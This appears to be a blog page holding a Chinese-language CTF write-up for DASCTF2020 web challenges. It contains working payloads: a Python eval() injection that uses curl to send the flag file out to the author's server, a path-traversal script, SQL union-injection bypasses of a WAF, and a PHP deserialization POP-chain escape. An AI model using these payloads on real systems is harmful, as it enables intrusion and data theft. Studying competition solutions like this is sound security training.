@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Ezfileinclude 考点：Unix时间戳、文件包含、目录穿越
+开局一张图，发现源码 image.php?t=1595664783&amp;amp;f=Z3F5LmpwZw==
+访问之，回显：What&#39;s your time? 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；
+直接写脚本，目录穿越读取/flag
+import timeimport requestsimport base64t = int(time.time())f = &#39;gqy.jpg?../../../../../../flag&#39;f = base64.b64encode(f.encode()).decode()print(t, f)host = &#39;http://183.129.189.60:10009/image.php?t={}&amp;amp;f={}&#39;.format(t, f)head = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;,&#39;Accept&#39;: &#39;text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;}r = requests.get(url=host, headers=head)print(r.text)SQLi 考点：无列名注入，sys.schema_tables_with_full_table_scans
+访问要求传入id参数：
+http://183.129.189.60:10004/?id=1;返回waf：
+return preg_match(&amp;quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;amp;|like|-|`/i&amp;quot;, $id); stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats
+or意味着过滤了information_schema
+由waf想到了union注入：
+?id=0%27union/**/select/**/1,2,3%23Array ( [0] =&amp;gt; 1 [id] =&amp;gt; 1 [1] =&amp;gt; 2 [username] =&amp;gt; 2 [2] =&amp;gt; 3 [password] =&amp;gt; 3 )可以看到库名：'><title>DASCTF2020</title>
+
+<link rel='canonical' href='https://example.com/p/dasctf2020/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='DASCTF2020'>
+<meta property='og:description' content='Ezfileinclude 考点：Unix时间戳、文件包含、目录穿越
+开局一张图，发现源码 image.php?t=1595664783&amp;amp;f=Z3F5LmpwZw==
+访问之，回显：What&#39;s your time? 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；
+直接写脚本，目录穿越读取/flag
+import timeimport requestsimport base64t = int(time.time())f = &#39;gqy.jpg?../../../../../../flag&#39;f = base64.b64encode(f.encode()).decode()print(t, f)host = &#39;http://183.129.189.60:10009/image.php?t={}&amp;amp;f={}&#39;.format(t, f)head = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;,&#39;Accept&#39;: &#39;text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;}r = requests.get(url=host, headers=head)print(r.text)SQLi 考点：无列名注入，sys.schema_tables_with_full_table_scans
+访问要求传入id参数：
+http://183.129.189.60:10004/?id=1;返回waf：
+return preg_match(&amp;quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;amp;|like|-|`/i&amp;quot;, $id); stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats
+or意味着过滤了information_schema
+由waf想到了union注入：
+?id=0%27union/**/select/**/1,2,3%23Array ( [0] =&amp;gt; 1 [id] =&amp;gt; 1 [1] =&amp;gt; 2 [username] =&amp;gt; 2 [2] =&amp;gt; 3 [password] =&amp;gt; 3 )可以看到库名：'>
+<meta property='og:url' content='https://example.com/p/dasctf2020/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="DASCTF2020">
+<meta name="twitter:description" content="Ezfileinclude 考点：Unix时间戳、文件包含、目录穿越
+开局一张图，发现源码 image.php?t=1595664783&amp;amp;f=Z3F5LmpwZw==
+访问之，回显：What&#39;s your time? 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；
+直接写脚本，目录穿越读取/flag
+import timeimport requestsimport base64t = int(time.time())f = &#39;gqy.jpg?../../../../../../flag&#39;f = base64.b64encode(f.encode()).decode()print(t, f)host = &#39;http://183.129.189.60:10009/image.php?t={}&amp;amp;f={}&#39;.format(t, f)head = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;,&#39;Accept&#39;: &#39;text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;}r = requests.get(url=host, headers=head)print(r.text)SQLi 考点：无列名注入，sys.schema_tables_with_full_table_scans
+访问要求传入id参数：
+http://183.129.189.60:10004/?id=1;返回waf：
+return preg_match(&amp;quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;amp;|like|-|`/i&amp;quot;, $id); stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats
+or意味着过滤了information_schema
+由waf想到了union注入：
+?id=0%27union/**/select/**/1,2,3%23Array ( [0] =&amp;gt; 1 [id] =&amp;gt; 1 [1] =&amp;gt; 2 [username] =&amp;gt; 2 [2] =&amp;gt; 3 [password] =&amp;gt; 3 )可以看到库名：">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://example.com" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/dasctf2020/">DASCTF2020</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <p>因为和第五空间连着，然后昨天下午又去打了一场AWD，感觉身体掏空，就认真打了DASCTF（咕咕咕），剩下的题目等有机会再复现</p>
+<hr>
+<h3 id="简单的计算器-1">简单的计算器-1</h3>
+<p>考点：python eval()代码注入，命令执行结果外带</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171633.png" alt="img"  /></p>
+<p>访问Source可以看到源码：</p>
+<pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from flask import Flask, render_template, request,session
+from config import black_list,create
+import os
+ 
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+ 
+## flag is in /flag try to get it
+ 
+@app.route('/', methods=['GET', 'POST'])
+def index():
+ 
+    def filter(string):#这里是下午暗改过的，本来只过滤了or
+        for black_word in black_list:
+            if black_word in string:
+                return &quot;hack&quot;
+        return string
+ 
+    if request.method == 'POST':
+        input = request.form['input']
+        create_question = create()
+        input_question = session.get('question')
+        session['question'] = create_question
+        if input_question==None:
+            return render_template('index.html', answer=&quot;Invalid session please try again!&quot;, question=create_question)
+        if filter(input)==&quot;hack&quot;:
+            return render_template('index.html', answer=&quot;hack&quot;, question=create_question)
+        try:
+            calc_result = str((eval(input_question + &quot;=&quot; + str(input))))
+            if calc_result == 'True':
+                result = &quot;Congratulations&quot;
+            elif calc_result == 'False':
+                result = &quot;Error&quot;
+            else:
+                result = &quot;Invalid&quot;
+        except:
+            result = &quot;Invalid&quot;
+        return render_template('index.html', answer=result,question=create_question)
+ 
+    if request.method == 'GET':
+        create_question = create()
+        session['question'] = create_question
+        return render_template('index.html',question=create_question)
+ 
+@app.route('/source')
+def source():
+        return open(&quot;app.py&quot;, &quot;r&quot;).read()
+ 
+if __name__ == '__main__':
+    app.run(host=&quot;0.0.0.0&quot;, debug=False)
+</code></pre><p>可以看到，31行那里把我们的结果和一个表达式进行简单的字符串拼接之后eval直接执行，这就给了我们命令注入的机会；</p>
+<p>我们来本地试一下：</p>
+<pre><code>#python3
+import os
+ 
+input_question = '100000='
+input = &quot;1,os.system(\'dir\')&quot;
+ 
+calc_result = str((eval(input_question + &quot;=&quot; + str(input))))
+print(calc_result)
+</code></pre><p>我们发现dir命令确实被执行了，但是题目没有回显，我们就只能用其他方式外带到我们的VPS上面去</p>
+<p>那么剩下的就只有绕waf了</p>
+<p>fuzz了一下，sys，import，os这些关键词过滤了，但是exec这些没有被过滤</p>
+<p>可以考虑字符串拼接或者逆读绕过，这里用的是逆读：</p>
+<pre><code>import os
+ 
+str = '''os.popen(&quot;curl ip:端口/?a=`cat /flag|base64`&quot;).read()'''#因为sys倒过来也是sys，所以换成popen
+print(str[::-1])
+#exec(')(daer.)&quot;`46esab|galf/ tac`=a?/0058:4.751.011.95 lruc&quot;(nepop.so'[::-1])
+</code></pre><p>发送payload，监听VPS相应端口，得到flag；</p>
+<h3 id="简单的计算器-2">简单的计算器-2</h3>
+<p>考点：？？？</p>
+<p>看了下源码：</p>
+<pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from flask import Flask, render_template, request,session
+from config import black_list,create
+import os
+ 
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+ 
+## flag is in /flag try to get it
+ 
+@app.route('/', methods=['GET', 'POST'])
+def index():
+ 
+    def filter(string):
+        for black_word in black_list:
+            if black_word in string:
+                return &quot;hack&quot;
+        return string
+ 
+    if request.method == 'POST':
+        input = request.form['input']
+        create_question = create()
+        input_question = session.get('question')
+        session['question'] = create_question
+        if input_question == None:
+            return render_template('index.html', answer=&quot;Invalid session please try again!&quot;, question=create_question)
+        if filter(input)==&quot;hack&quot;:
+            return render_template('index.html', answer=&quot;hack&quot;, question=create_question)
+        calc_str = input_question + &quot;=&quot; + str(input)
+        try:
+            calc_result = str((eval(calc_str)))
+        except Exception as ex:
+            calc_result = &quot;Invalid&quot;
+        return render_template('index.html', answer=calc_result,question=create_question)
+ 
+    if request.method == 'GET':
+        create_question = create()
+        session['question'] = create_question
+        return render_template('index.html',question=create_question)
+ 
+@app.route('/source')
+def source():
+        return open(&quot;app.py&quot;, &quot;r&quot;).read()
+ 
+if __name__ == '__main__':
+    app.run(host=&quot;0.0.0.0&quot;, debug=False)
+</code></pre><p>大同小异；</p>
+<p>用上一道题的payload直接秒了……啊……这……</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171646.png" alt="img"  /></p>
+<p>可能本来上一道题的不需要绕waf，但是后来暗改了之后改成一道题了。。。</p>
+<p>后来和学长交流，说是可以用沙箱逃逸来做，可能沙箱逃逸才是想考的。</p>
+<h3 id="phpuns">phpuns</h3>
+<p>考点：反序列化字符逃逸，pop链，16进制绕过关键字</p>
+<p>直接给了源码的附件：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/DASCTF2020.6/DASCTF_2020.6_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.zip"  target="_blank" rel="noopener"
+    >DASCTF_2020.6_反序列化_source</a></p>
+<p>先构造pop链；</p>
+<h4 id="pop链利用">POP链利用</h4>
+<p>很明显class.php里面的类是给我们利用的，构造很简单：</p>
+<pre><code>$pop = new Hacker_A;
+$pop-&gt;c2e38 = new Hacker_B;
+$pop-&gt;c2e38-&gt;c2e38 = new Hacker_C;
+</code></pre><p>生成了：</p>
+<pre><code>O:8:&quot;Hacker_A&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_B&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_C&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}}}
+#一共103个字符
+</code></pre><h4 id="反序列化字符逃逸">反序列化字符逃逸</h4>
+<p>我们可以看到index.php第29行调用了add函数：</p>
+<pre><code>$_SESSION['info'] = add(serialize($user));
+</code></pre><p>然后info.php第6行调用了reduce函数：</p>
+<pre><code>$tmp = unserialize(reduce($_SESSION['info']));
+</code></pre><p>我们去看functions.php里面这两个函数的定义：</p>
+<pre><code>function add($data)
+{
+    $data = str_replace(chr(0).'*'.chr(0), '\0*\0', $data);
+    return $data;
+}
+ 
+function reduce($data)
+{
+    $data = str_replace('\0*\0', chr(0).'*'.chr(0), $data);
+    return $data;
+}
+</code></pre><p><code>chr(0).'*'.chr(0)</code> 也就是 <code>N*N</code> （N表示null）占三个字符，而 <code>\0*\0</code> 占五个字符，当我们的 <code>\0*\0</code> 被替换为 <code>N*N</code> 之后就少了两个字符，于是我们就能在反序列化中吞掉后面两个字符；（参考本站：<a class="link" href="http://wh1sper.com/fakephp%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8/"  target="_blank" rel="noopener"
+    >安恒4月赛反序列化字符逃逸</a>）</p>
+<p>如果我们直接把pop链构造的结果传给password的话，序列化的结果是这样：</p>
+<pre><code>s:8:&quot;username&quot;;s:5:&quot;input&quot;;s:8:&quot;password&quot;;s:103:&quot;O:8:&quot;Hacker_A&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_B&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_C&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}}}&quot;
+</code></pre><p>我们这103个字符被因为s:103被当作字符串处理，于是我们利用吞字符，把 <code>&quot;;s:8:&quot;password&quot;;s:103:&quot;</code> （24个字符，12组 <code>\0*\0</code> ）这一段吞掉，然后把下面的传给password：</p>
+<pre><code>&quot;;s:8:&quot;password&quot;;O:8:&quot;Hacker_A&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_B&quot;:1:{s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_C&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}}}
+</code></pre><p>那么我们就成功的就行了逃逸；</p>
+<p>不过，在反序列化之前，info.php里面第5行有： <code>check(reduce($_SESSION['info']));</code></p>
+<p>check函数会检查我们的字符里面是否有 <code>c2e38</code> ，所以用S:5:&quot;\63\32\65\33\38&quot;来绕过，和用S+\00来绕过chr(0)是一样的，因为S大写，后面字符串里就可以解析hex了</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
